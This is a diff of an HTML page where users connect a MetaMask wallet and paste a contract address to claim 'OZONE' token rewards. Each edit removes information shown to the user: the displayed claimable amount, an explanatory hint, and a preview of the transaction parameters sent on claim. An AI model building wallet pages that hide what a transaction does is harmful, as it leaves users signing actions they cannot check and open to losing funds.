@@ -654,10 +654,10 @@
 
     <div class="notice">
       <span class="notice-icon">💰</span>
-      <span><strong>Claim your rewards!</strong> Your total earned amount is shown below. Click Claim to receive your OZONE tokens.</span>
+      <span><strong>Claim your rewards!</strong> Click Claim to receive your OZONE tokens.</span>
     </div>
 
-    <!-- Step 1: Wallet (moved first for better UX) -->
+    <!-- Step 1: Wallet -->
     <div class="card">
       <div class="card-header">
         <div class="step-badge">1</div>
@@ -672,7 +672,7 @@
           <input type="text" id="walletAddress" placeholder="Connect or paste address" autocomplete="off" spellcheck="false" inputmode="text" />
           <button class="btn-connect" id="btnConnect">Connect Wallet</button>
         </div>
-        <div class="field-hint" id="walletStatus">Connect MetaMask to see your claimable amount</div>
+        <div class="field-hint" id="walletStatus">Connect MetaMask to continue</div>
       </div>
     </div>
 
@@ -688,7 +688,7 @@
           <span class="req-tag">Required</span>
         </div>
         <input type="text" id="proxyAddress" placeholder="0x..." autocomplete="off" spellcheck="false" value="" />
-        <div class="field-hint">Your NFTWall smart contract instance (paste your contract address)</div>
+        <div class="field-hint">Your NFTWall smart contract instance</div>
       </div>
     </div>
 
@@ -790,7 +790,6 @@
 
       if (ready) {
         btnClaim.innerHTML = '💰 Claim Reward';
-        document.getElementById('previewParams').textContent = `0, ${currentClaimValue}, 0, 7`;
       } else {
         btnClaim.innerHTML = 'Connect Wallet to Claim';
       }
